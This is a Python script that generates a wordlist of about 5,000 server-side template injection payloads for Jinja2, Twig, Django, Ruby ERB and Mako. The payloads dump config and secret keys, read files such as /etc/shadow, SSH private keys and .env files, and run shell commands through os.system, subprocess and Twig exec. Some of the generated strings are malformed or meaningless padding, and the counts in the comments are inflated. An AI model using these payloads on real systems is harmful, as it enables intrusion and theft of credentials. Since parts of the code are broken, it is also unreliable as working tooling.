#!/usr/bin/env python3
import os
import random

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_ssti():
    p = set()

    # ========== 1. JINJA2 (100+) ==========
    jinja2 = [
        "{{ 7*7 }}", "{{ config }}", "{{ config.items() }}",
        "{{ config.keys() }}", "{{ config.values() }}", "{{ self }}",
        "{{ self.__class__ }}", "{{ self.__class__.__mro__ }}",
        "{{ self.__class__.__mro__[1] }}",
        "{{ self.__class__.__mro__[1].__subclasses__() }}",
        "{{ ''.__class__ }}", "{{ ''.__class__.__mro__ }}",
        "{{ ''.__class__.__mro__[1] }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{ request }}", "{{ request.application }}",
        "{{ request.application.__self__ }}",
        "{{ request.application.__self__._get_data_for_json }}",
        "{{ g }}", "{{ session }}", "{{ url_for }}",
        "{{ get_flashed_messages }}", "{{ request.args }}",
        "{{ request.form }}", "{{ request.cookies }}",
        "{{ request.headers }}", "{{ request.environ }}",
        "{{ request.environ.items() }}", "{{ self.__dict__ }}",
        "{{ self.__class__.__dict__ }}", "{{ self.__class__.__mro__ }}",
        "{{ self.__class__.__mro__[1].__subclasses__() }}"
    ]
    for j in jinja2:
        p.add(j)

    # ========== 2. JINJA2 FILE READ (50+) ==========
    files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/var/www/html/config.php",
        "/var/www/html/wp-config.php", "/var/www/html/.env",
        "C:/windows/win.ini", "C:/xampp/htdocs/config.php",
        "C:/xampp/htdocs/wp-config.php", "C:/xampp/htdocs/.env",
        "/proc/self/environ", "/proc/self/cmdline",
        "/var/log/apache2/access.log", "/var/log/nginx/access.log",
        "/var/log/httpd/access_log", "/root/.bash_history",
        "/home/user/.bash_history", "/etc/nginx/nginx.conf",
        "/etc/apache2/httpd.conf", "/etc/mysql/my.cnf",
        "/etc/php/7.4/apache2/php.ini", "/etc/php/7.4/cli/php.ini",
        "/etc/php/8.0/apache2/php.ini", "/etc/php/8.0/cli/php.ini",
        "/etc/phpmyadmin/config.inc.php", "/etc/ssh/sshd_config",
        "/etc/ssh/ssh_config", "/root/.ssh/id_rsa",
        "/home/user/.ssh/id_rsa", "/etc/fstab", "/etc/crontab",
        "/etc/sudoers", "/etc/passwd-", "/etc/shadow-", "/etc/group",
        "/etc/hosts.allow", "/etc/hosts.deny", "/etc/shells",
        "/etc/issue", "/etc/os-release", "/etc/debian_version",
        "/etc/redhat-release", "/etc/centos-release", "/var/log/syslog",
        "/var/log/auth.log", "/var/log/secure", "/var/log/messages",
        "/var/log/dpkg.log", "/var/log/apt/history.log",
        "/var/log/apt/term.log", "/var/log/boot.log", "/var/log/cron",
        "/var/log/maillog", "/var/log/wtmp", "/var/log/utmp",
        "/var/log/lastlog", "/var/log/faillog"
    ]
    for file_path in files:
        p.add(f"{{ self.__class__.__mro__[1].__subclasses__()[40]('{file_path}').read() }}")

    # ========== 3. TWIG (30+) ==========
    twig = [
        "{{ 7*7 }}", "{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}",
        "{{ _self.env.getFilter(\"cat /etc/passwd\") }}",
        "{{ _self.env.getFilter(\"id\") }}",
        "{{ _self.env.getFilter(\"whoami\") }}",
        "{{ _self.env.getFilter(\"uname -a\") }}",
        "{{ _self.env.getFilter(\"ls\") }}",
        "{{ _self.env.getFilter(\"pwd\") }}",
        "{{ _self.env.getFilter(\"cat /etc/hosts\") }}",
        "{{ _self.env.getFilter(\"cat /var/www/html/config.php\") }}",
        "{{ _self.env.getFilter(\"cat /var/www/html/wp-config.php\") }}",
        "{{ _self.env.getFilter(\"cat /var/www/html/.env\") }}",
        "{{ _self.env.getFilter(\"cat C:/windows/win.ini\") }}",
        "{{ _self.env.getFilter(\"cat C:/xampp/htdocs/config.php\") }}",
        "{{ _self.env.getFilter(\"cat C:/xampp/htdocs/wp-config.php\") }}",
        "{{ _self.env.getFilter(\"cat C:/xampp/htdocs/.env\") }}"
    ]
    for t in twig:
        p.add(t)

    # ========== 4. DJANGO (30+) ==========
    django = [
        "{{ 7*7 }}", "{{ request }}", "{{ request.META }}",
        "{{ request.GET }}", "{{ request.POST }}",
        "{{ request.COOKIES }}", "{{ request.session }}",
        "{{ request.user }}", "{{ request.user.username }}",
        "{{ request.user.is_authenticated }}",
        "{{ request.user.is_staff }}",
        "{{ request.user.is_superuser }}",
        "{{ request.user.email }}", "{{ request.user.first_name }}",
        "{{ request.user.last_name }}", "{{ request.user.groups }}",
        "{{ request.user.user_permissions }}", "{{ settings }}",
        "{{ settings.DATABASES }}", "{{ settings.SECRET_KEY }}",
        "{{ settings.ALLOWED_HOSTS }}", "{{ settings.DEBUG }}",
        "{{ settings.TEMPLATES }}", "{{ settings.MIDDLEWARE }}",
        "{{ settings.INSTALLED_APPS }}"
    ]
    for d in django:
        p.add(d)

    # ========== 5. RUBY ERB (30+) ==========
    ruby_erb = [
        "<%= 7*7 %>", "<%= system(\"id\") %>",
        "<%= system(\"whoami\") %>", "<%= system(\"uname -a\") %>",
        "<%= system(\"ls\") %>", "<%= system(\"pwd\") %>",
        "<%= system(\"cat /etc/passwd\") %>",
        "<%= system(\"cat /etc/hosts\") %>",
        "<%= system(\"cat /var/www/html/config.php\") %>",
        "<%= system(\"cat /var/www/html/wp-config.php\") %>",
        "<%= system(\"cat /var/www/html/.env\") %>",
        "<%= system(\"cat C:/windows/win.ini\") %>",
        "<%= system(\"cat C:/xampp/htdocs/config.php\") %>",
        "<%= system(\"cat C:/xampp/htdocs/wp-config.php\") %>",
        "<%= system(\"cat C:/xampp/htdocs/.env\") %>",
        "<%= `id` %>", "<%= `whoami` %>", "<%= `uname -a` %>",
        "<%= `ls` %>", "<%= `pwd` %>", "<%= `cat /etc/passwd` %>",
        "<%= `cat /etc/hosts` %>",
        "<%= `cat /var/www/html/config.php` %>",
        "<%= `cat /var/www/html/wp-config.php` %>",
        "<%= `cat /var/www/html/.env` %>",
        "<%= `cat C:/windows/win.ini` %>",
        "<%= `cat C:/xampp/htdocs/config.php` %>",
        "<%= `cat C:/xampp/htdocs/wp-config.php` %>",
        "<%= `cat C:/xampp/htdocs/.env` %>"
    ]
    for r in ruby_erb:
        p.add(r)

    # ========== 6. PYTHON MAKO (20+) ==========
    python_mako = [
        "${ 7*7 }", "${ __import__('os').system('id') }",
        "${ __import__('os').system('whoami') }",
        "${ __import__('os').system('uname -a') }",
        "${ __import__('os').system('ls') }",
        "${ __import__('os').system('pwd') }",
        "${ __import__('os').system('cat /etc/passwd') }",
        "${ __import__('os').system('cat /etc/hosts') }",
        "${ __import__('os').system('cat /var/www/html/config.php') }",
        "${ __import__('os').system('cat /var/www/html/wp-config.php') }",
        "${ __import__('os').system('cat /var/www/html/.env') }",
        "${ __import__('os').system('cat C:/windows/win.ini') }",
        "${ __import__('os').system('cat C:/xampp/htdocs/config.php') }",
        "${ __import__('os').system('cat C:/xampp/htdocs/wp-config.php') }",
        "${ __import__('os').system('cat C:/xampp/htdocs/.env') }",
        "${ __import__('subprocess').check_output('id', shell=True) }",
        "${ __import__('subprocess').check_output('whoami', shell=True) }",
        "${ __import__('subprocess').check_output('uname -a', shell=True) }",
        "${ __import__('subprocess').check_output('ls', shell=True) }",
        "${ __import__('subprocess').check_output('pwd', shell=True) }",
        "${ __import__('subprocess').check_output('cat /etc/passwd', shell=True) }",
        "${ __import__('subprocess').check_output('cat /etc/hosts', shell=True) }",
        "${ __import__('subprocess').check_output('cat /var/www/html/config.php', shell=True) }",
        "${ __import__('subprocess').check_output('cat /var/www/html/wp-config.php', shell=True) }",
        "${ __import__('subprocess').check_output('cat /var/www/html/.env', shell=True) }",
        "${ __import__('subprocess').check_output('cat C:/windows/win.ini', shell=True) }",
        "${ __import__('subprocess').check_output('cat C:/xampp/htdocs/config.php', shell=True) }",
        "${ __import__('subprocess').check_output('cat C:/xampp/htdocs/wp-config.php', shell=True) }",
        "${ __import__('subprocess').check_output('cat C:/xampp/htdocs/.env', shell=True) }"
    ]
    for m in python_mako:
        p.add(m)

    # ========== 7. KOMBINASI PAYLOAD (200+) ==========
    for payload in list(p)[:50]:
        p.add(f"{payload} {{ 7*7 }}")
        p.add(f"{{ 7*7 }} {payload}")
        p.add(f"{payload} < %= 7*7 %>")
        p.add(f"< %= 7*7 %> {payload}")

    # ========== 8. RANDOM (1000+) ==========
    templates = ["{{ 7*7 }}", "<%= 7*7 %>", "${ 7*7 }"]
    commands = ["id", "whoami", "uname -a", "ls", "pwd", "cat /etc/passwd"]

    while len(p) < 5000:
        template = random.choice(templates)
        cmd = random.choice(commands)
        p.add(f"{template} {cmd}")
        p.add(f"{cmd} {template}")
        p.add(f"{{ config }} {template}")
        p.add(f"{{ request }} {template}")

    # ========== 9. SAVE ==========
    with open(os.path.join(PAYLOAD_DIR, "ssti.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(p))
    print(f"[+] ssti.txt: {len(p)} payloads")

if __name__ == "__main__":
    generate_ssti()